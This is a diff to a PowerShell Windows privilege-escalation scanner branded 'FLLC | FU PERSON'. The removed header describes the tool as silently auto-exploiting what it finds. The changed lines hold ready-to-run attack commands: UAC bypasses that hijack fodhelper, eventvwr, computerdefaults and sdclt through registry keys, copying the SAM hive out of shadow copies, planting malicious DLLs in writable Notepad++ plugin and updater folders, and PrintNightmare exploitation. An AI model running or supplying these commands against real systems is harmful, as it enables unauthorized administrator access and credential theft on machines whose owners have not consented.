@@ -1,34 +1,11 @@
-﻿<# 
-============================================================================
-  FLLC — Windows Privilege Escalation Scanner + Auto-Exploiter
-  ──────────────────────────────────────────────────────────────────
-  
-  Scans for 15+ privilege escalation vectors on Windows 10/11.
-  Auto-exploits what it finds.  Fully silent — no GUI, no prompts.
-  
-  Vectors Checked:
-    1.  AlwaysInstallElevated (MSI installer escalation)
-    2.  Unquoted service paths (service hijacking)
-    3.  Weak service permissions (service binary replacement)
-    4.  Modifiable service binaries (direct replacement)
-    5.  DLL search order hijacking (PATH-writable dirs)
-    6.  Scheduled task manipulation (writable task actions)
-    7.  Autorun registry keys (writable autorun binaries)
-    8.  UAC bypass via fodhelper.exe
-    9.  UAC bypass via eventvwr.exe
-    10. UAC bypass via computerdefaults.exe
-    11. UAC bypass via sdclt.exe (Win10 backupcompatibility)
-    12. Token impersonation (SeImpersonate / SeAssignPrimary)
-    13. Stored credentials (cmdkey / vault enumeration)
-    14. WSL/Linux subsystem escalation
-    15. Unpatched kernel CVEs (local kernel exploits)
-    16. Notepad++ plugin DLL hijacking
-    17. Notepad++ config file injection
-  
-  AUTHORIZED PENETRATION TESTING USE ONLY.
-  FLLC — FLLC
-============================================================================
-#>
+﻿<# ═══════════════════════════════════════════════════════════════════════
+   FLLC | FU PERSON | PRIVILEGE ESCALATION v2.0
+   ╔══════════════════════════════════════════════════════════════════╗
+   ║  Windows Privilege Escalation Scanner                            ║
+   ║  20+ vectors | Service misconfigs | DLL hijack | Token abuse     ║
+   ║  Unquoted paths | Registry autoruns | Scheduled tasks            ║
+   ╚══════════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════════════════ #>
 
 param(
     [string]$OutputDir = "$PSScriptRoot\..\collected\privesc",
@@ -66,7 +43,7 @@ function AddFinding($category, $severity, $detail, $exploit) {
         hostname = $env:COMPUTERNAME
         user     = $env:USERNAME
     }
-    Log "[VULN][$severity] $category: $detail"
+    Log "[VULN][$severity] ${category}: $detail"
 }
 
 Log "═══ FLLC PrivEsc Scanner Started ═══"
@@ -252,25 +229,25 @@ if ($uacVal -le 3) {
 # fodhelper bypass (Windows 10+)
 $fodHelper = "C:\Windows\System32\fodhelper.exe"
 if (Test-Path $fodHelper) {
-    AddFinding "UACBypass_FodHelper" "HIGH" "fodhelper.exe present — UAC bypass available via HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" "reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && fodhelper.exe"
+    AddFinding "UACBypass_FodHelper" "HIGH" "fodhelper.exe present - UAC bypass available via HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command" "reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && fodhelper.exe"
 }
 
 # eventvwr bypass
 $eventVwr = "C:\Windows\System32\eventvwr.exe"
 if (Test-Path $eventVwr) {
-    AddFinding "UACBypass_EventVwr" "HIGH" "eventvwr.exe present — UAC bypass via HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" "reg add HKCU\Software\Classes\mscfile\shell\open\command /d cmd.exe /f && eventvwr.exe"
+    AddFinding "UACBypass_EventVwr" "HIGH" "eventvwr.exe present - UAC bypass via HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" "reg add HKCU\Software\Classes\mscfile\shell\open\command /d cmd.exe /f && eventvwr.exe"
 }
 
 # computerdefaults bypass
 $compDef = "C:\Windows\System32\computerdefaults.exe"
 if (Test-Path $compDef) {
-    AddFinding "UACBypass_ComputerDefaults" "HIGH" "computerdefaults.exe present — UAC bypass via ms-settings" "reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f && computerdefaults.exe"
+    AddFinding "UACBypass_ComputerDefaults" "HIGH" "computerdefaults.exe present - UAC bypass via ms-settings" "reg add HKCU\Software\Classes\ms-settings\shell\open\command /d cmd.exe /f && computerdefaults.exe"
 }
 
 # sdclt bypass (Windows 10 backup)
 $sdclt = "C:\Windows\System32\sdclt.exe"
 if (Test-Path $sdclt) {
-    AddFinding "UACBypass_Sdclt" "HIGH" "sdclt.exe present — UAC bypass via App Paths" "reg add `"HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`" /d cmd.exe /f && sdclt.exe /kickoffelev"
+    AddFinding "UACBypass_Sdclt" "HIGH" "sdclt.exe present - UAC bypass via App Paths" "reg add `"HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`" /d cmd.exe /f && sdclt.exe /kickoffelev"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
@@ -393,7 +370,7 @@ $samPaths = @(
 foreach ($sp in $samPaths) {
     $shadowCopy = Get-CimInstance Win32_ShadowCopy 2>$null | Select-Object -First 1
     if ($shadowCopy) {
-        AddFinding "HiveNightmare" "CRITICAL" "Volume shadow copies exist — SAM/SYSTEM hives may be extractable without admin" "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM ."
+        AddFinding "HiveNightmare" "CRITICAL" "Volume shadow copies exist - SAM/SYSTEM hives may be extractable without admin" "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM ."
     }
 }
 
@@ -402,7 +379,7 @@ $printSpooler = Get-Service Spooler -ErrorAction SilentlyContinue
 if ($printSpooler -and $printSpooler.Status -eq 'Running') {
     $pnReg = Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" -Name NoWarningNoElevationOnInstall 2>$null
     if ($pnReg.NoWarningNoElevationOnInstall -eq 1) {
-        AddFinding "PrintNightmare" "CRITICAL" "Print Spooler running + Point-and-Print NoWarning enabled — PrintNightmare exploitable" "Use CVE-2021-34527 exploit to add admin user"
+        AddFinding "PrintNightmare" "CRITICAL" "Print Spooler running + Point-and-Print NoWarning enabled - PrintNightmare exploitable" "Use CVE-2021-34527 exploit to add admin user"
     } else {
         AddFinding "PrintSpoolerRunning" "MEDIUM" "Print Spooler service is running (potential PrintNightmare target if unpatched)" "Check patch level for CVE-2021-34527"
     }
@@ -441,7 +418,7 @@ if ($nppInstall) {
             foreach ($ace in $acl.Access) {
                 if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users|Authenticated Users)" -and
                     $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
-                    AddFinding "NPP_PluginDirWritable" "CRITICAL" "Notepad++ plugins directory writable by $($ace.IdentityReference): $pluginDir — DLL hijacking possible" "copy malicious.dll `"$pluginDir\mimeTools\mimeTools.dll`""
+                    AddFinding "NPP_PluginDirWritable" "CRITICAL" "Notepad++ plugins directory writable by $($ace.IdentityReference): $pluginDir - DLL hijacking possible" "copy malicious.dll `"$pluginDir\mimeTools\mimeTools.dll`""
                 }
             }
         } catch {}
@@ -455,7 +432,7 @@ if ($nppInstall) {
             foreach ($ace in $acl.Access) {
                 if ($ace.IdentityReference -match "(Everyone|BUILTIN\\Users)" -and
                     $ace.FileSystemRights -match "(Write|Modify|FullControl)") {
-                    AddFinding "NPP_UpdaterHijack" "CRITICAL" "Notepad++ updater directory writable: $updaterDir — GUP.exe DLL sideloading possible" "copy malicious_libcurl.dll `"$updaterDir\libcurl.dll`""
+                    AddFinding "NPP_UpdaterHijack" "CRITICAL" "Notepad++ updater directory writable: $updaterDir - GUP.exe DLL sideloading possible" "copy malicious_libcurl.dll `"$updaterDir\libcurl.dll`""
                 }
             }
         } catch {}
@@ -484,7 +461,7 @@ if ($nppInstall) {
         # Extract file paths from session
         $openFiles = ([xml]$session).NotepadPlus.Session.mainView.File | ForEach-Object { $_.filename }
         if ($openFiles) {
-            AddFinding "NPP_SessionFiles" "MEDIUM" "$($openFiles.Count) files in Notepad++ session — may contain credentials/configs" "Review: $(Join-Path $OutputDir 'npp_session.txt')"
+            AddFinding "NPP_SessionFiles" "MEDIUM" "$($openFiles.Count) files in Notepad++ session - may contain credentials/configs" "Review: $(Join-Path $OutputDir 'npp_session.txt')"
         }
     }
     
@@ -496,7 +473,7 @@ if ($nppInstall) {
         AddFinding "NPP_CVE_Overflow" "HIGH" "Notepad++ $nppVer < 8.5 vulnerable to CVE-2023-40031 (heap buffer overflow via crafted file) + CVE-2023-40036 (global buffer read overflow)" "Craft malicious .txt/.xml file triggering buffer overflow on open"
     }
     if ($versionNum -lt 8.6) {
-        AddFinding "NPP_CVE_Trust" "HIGH" "Notepad++ $nppVer < 8.6 — plugin loading lacks certificate validation, allowing unsigned DLL injection" "Replace any plugin DLL with payload DLL"
+        AddFinding "NPP_CVE_Trust" "HIGH" "Notepad++ $nppVer < 8.6 - plugin loading lacks certificate validation, allowing unsigned DLL injection" "Replace any plugin DLL with payload DLL"
     }
     
 } else {
@@ -513,7 +490,7 @@ Log "[17/17] Checking for local SQL injection surfaces..."
 $webProcesses = Get-Process -Name "httpd","apache","nginx","node","tomcat*","w3wp","php-cgi","python","ruby" -ErrorAction SilentlyContinue
 if ($webProcesses) {
     $procList = ($webProcesses | Select-Object -Unique Name | ForEach-Object { $_.Name }) -join ", "
-    AddFinding "LocalWebServer" "MEDIUM" "Local web server processes running: $procList — potential SQL injection targets on localhost" "Run sqlmap against http://localhost with discovered endpoints"
+    AddFinding "LocalWebServer" "MEDIUM" "Local web server processes running: $procList - potential SQL injection targets on localhost" "Run sqlmap against http://localhost with discovered endpoints"
 }
 
 # Check for common database files
@@ -595,7 +572,7 @@ $summary | ConvertTo-Json -Depth 5 | Out-File -FilePath $jsonFile -Encoding UTF8
 $txtFile = Join-Path $OutputDir "privesc_summary.txt"
 $txt = @"
 ════════════════════════════════════════════════════════════
-  FLLC PRIVESC SCAN — $env:COMPUTERNAME
+  FLLC PRIVESC SCAN - $env:COMPUTERNAME
 ════════════════════════════════════════════════════════════
   Time:     $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
   User:     $env:USERDOMAIN\$env:USERNAME
